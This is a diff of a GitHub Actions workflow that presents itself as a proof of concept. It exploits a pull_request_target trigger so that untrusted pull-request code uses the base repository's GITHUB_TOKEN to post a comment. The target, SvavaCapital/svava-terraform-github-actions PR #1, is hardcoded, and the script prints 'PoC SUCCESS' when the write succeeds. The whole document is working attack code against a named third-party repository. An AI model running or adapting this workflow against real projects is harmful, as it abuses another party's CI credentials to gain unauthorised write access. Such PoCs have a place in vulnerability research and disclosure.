@@ -1,4 +1,4 @@
-name: PoC - Comment Using Base Repository Token
+name: PoC - Comment on Base Repository PR
 
 on:
   pull_request_target:
@@ -10,40 +10,40 @@ permissions:
   pull-requests: write
 
 jobs:
-  prove-write-authority:
+  prove-base-token-misuse:
     runs-on: ubuntu-latest
 
     steps:
-      - name: Checkout PR code from fork
+      - name: Checkout PR code
         uses: actions/checkout@v3
 
-      - name: Post Authenticated Comment as Base Repo Owner
+      - name: Post Comment to Base Repository PR
         run: |
-          echo "=== Proof of Concept: Write Authority ==="
+          echo "=== Proof of Concept: Base Repo Write Test ==="
 
-          PR_NUMBER=${{ github.event.pull_request.number }}
+          BASE_OWNER="SvavaCapital"
+          BASE_REPO="svava-terraform-github-actions"
+          TARGET_PR=1
 
-          COMMENT_BODY="POC tested"
-
-          echo "[*] Attempting to post comment to PR: $PR_NUMBER"
+          echo "[*] Attempting to post comment to: $BASE_OWNER/$BASE_REPO PR #$TARGET_PR"
 
           STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
             -X POST \
             -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
             -H "Accept: application/vnd.github+json" \
-            https://api.github.com/repos/SvavaCapital/svava-terraform-github-actions/issues/$PR_NUMBER/comments \
-            -d "{\"body\":\"$COMMENT_BODY\"}")
+            https://api.github.com/repos/$BASE_OWNER/$BASE_REPO/issues/$TARGET_PR/comments \
+            -d '{"body":"POC tested"}')
 
-          echo "HTTP status from comment API: $STATUS"
+          echo "HTTP status from base repo comment API: $STATUS"
 
-          if [ "$STATUS" = "201" ] || [ "$STATUS" = "200" ]; then
-            echo "[+] PoC SUCCESS: Base repository token used to comment ❌"
+          if [ "$STATUS" = "201" ]; then
+            echo "[+] PoC SUCCESS: Untrusted PR code used base repository token to comment ❌"
           else
             echo "[-] PoC FAILED with status: $STATUS"
           fi
 
           echo ""
-          echo "Execution repository according to runtime:"
+          echo "Runtime repository (for context only):"
           echo "$GITHUB_REPOSITORY"
 
           echo "=== End of PoC ==="
